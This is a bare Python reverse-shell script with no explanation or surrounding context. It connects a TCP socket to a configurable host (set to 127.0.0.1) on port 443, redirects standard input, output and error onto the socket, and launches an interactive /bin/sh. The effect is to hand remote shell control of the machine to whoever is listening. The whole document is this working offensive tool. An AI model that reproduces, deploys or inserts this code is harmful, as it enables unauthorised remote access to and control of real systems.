#!/usr/bin/python

import socket
import subprocess
import os

RHOST = '127.0.0.1'
RPORT = 443


def CreateSocket():
    global RHOST
    global RPORT
    global s

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        print('[-] Error while creating socket')


def ConnectSocket():
    global RHOST
    global RPORT
    global s

    try:
        s.connect((RHOST, RPORT))
    except:
        print('[-] Error while connecting')


def Shell():
    try:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/sh', '-i'])
    except:
        print('[-] Error while getting the shell')


def main():
    CreateSocket()
    ConnectSocket()
    Shell()

main()



